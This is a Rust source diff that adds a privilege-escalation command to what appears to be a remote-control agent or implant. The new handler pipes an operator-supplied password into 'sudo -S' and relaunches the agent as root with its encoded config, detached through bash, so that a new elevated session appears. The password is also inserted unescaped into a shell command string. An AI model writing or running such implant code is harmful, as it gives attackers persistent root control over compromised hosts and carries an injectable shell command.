@@ -1,6 +1,9 @@
 use std::error::Error;
-use sysinfo::{ProcessExt, System, SystemExt, User, UserExt};
-use whoami::{username};
+use sysinfo::{System, SystemExt, UserExt};
+use whoami::username;
+use crate::config::ConfigOptions;
+use std::env::args;
+use std::process::Command;
 
 /// Determines whether a session can elevate privileges.
 /// 
@@ -13,7 +16,7 @@ pub fn can_elevate() -> bool {
     
     #[cfg(not(windows))] {
         // Get username and match it against list of users that has data
-        let mut s = System::new_all();
+        let s = System::new_all();
         let username = username();
         let user = s.users()
         .into_iter()
@@ -31,11 +34,27 @@ pub fn can_elevate() -> bool {
 
 }
 
-pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
+/// Attempts to elevate privileges. If successful, a new session
+/// will be opened as the elevated user.
+/// 
+/// Usage: `elevate [method] [password]`
+/// 
+/// Because we can't wait for the output of the child process, 
+/// we toss the handle.
+pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
     if can_elevate() {
-        match s.trim() {
+        let mut elevate_args = s.split(" ");
+        match elevate_args.nth(0).unwrap().trim() {
             "sudo" => {
-                Ok("Elevating via sudo".to_string())
+                let pwd = elevate_args.nth(0).unwrap();
+                let encoded_config = config_options.to_base64();
+                let agent_path = args().nth(0).unwrap();
+                let cmd_string = format!("echo '{pwd}' | sudo -S  {agent_path} -b {encoded_config} & disown");
+                Command::new("/bin/bash")
+                .arg("-c")
+                .arg(cmd_string)
+                .spawn()?;
+                Ok("Elevation attempted. Look for the new agent!".to_string())
             },
             _ => Ok("Unknown elevation method".to_string())
         }
